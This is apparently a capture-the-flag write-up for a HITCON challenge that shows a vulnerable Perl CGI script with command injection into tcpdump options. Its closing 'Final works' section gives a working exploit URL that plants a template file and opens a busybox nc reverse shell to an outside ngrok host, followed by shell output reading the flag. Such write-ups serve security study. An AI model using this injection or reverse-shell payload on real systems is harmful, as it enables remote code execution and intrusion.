# Description
Author: [@orange_8361](https://twitter.com/orange_8361)
```
Virtual Public Network [500pts]
Vulnerable Point of Your Network :)
http://13.231.137.9
```

# Hint
```html
<!-- Hint for you :)
<a href='diag.cgi'>diag.cgi</a>
<a href='DSSafe.pm'>DSSafe.pm</a>  -->
```

# diag.cgi
```perl
#!/usr/bin/perl
use lib '/var/www/html/';
use strict;

use CGI ();
use DSSafe;


sub tcpdump_options_syntax_check {
    my $options = shift;
    return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;
    return undef;
}
 
print "Content-type: text/html\n\n";
 
my $options = CGI::param("options");
my $output = tcpdump_options_syntax_check($options);
 

# backdoor :)
my $tpl = CGI::param("tpl");
if (length $tpl > 0 && index($tpl, "..") == -1) {
    $tpl = "./tmp/" . $tpl . ".thtml";
    require($tpl);
}
```
# Command Injection
```perl
return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;
```
# Post on Author's blog
[http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html](http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html)

# Timeline
- Setup Docker container (apache)
- Read author's blog :p
- Discover absolute path of `./tmp/` template dir: `/usr/lib/cgi-bin/tmp/` (thanks to Docker)
- Execute `ls /`, reverse tcp using busybox: `/bin/busybox nc 0.tcp.ap.ngrok.io 12523 -e /bin/sh`
- Read flag: `cd / && ./\$READ_FLAG\$`

# Final works
`http://13.231.137.9/cgi-bin/diag.cgi?options=-r$x="/bin/busybox nc 0.tcp.ap.ngrok.io 12523 -e /bin/sh",system$x%23 2>/usr/lib/cgi-bin/tmp/vinhjaxt.thtml <&tpl=vinhjaxt`
```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34036
whoami
www-data
cd /
ls
$READ_FLAG$
FLAG
bin
boot
dev
etc
home
initrd.img
initrd.img.old
...

./\$READ_FLAG\$
hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}

```
Please read author's post for more informations.
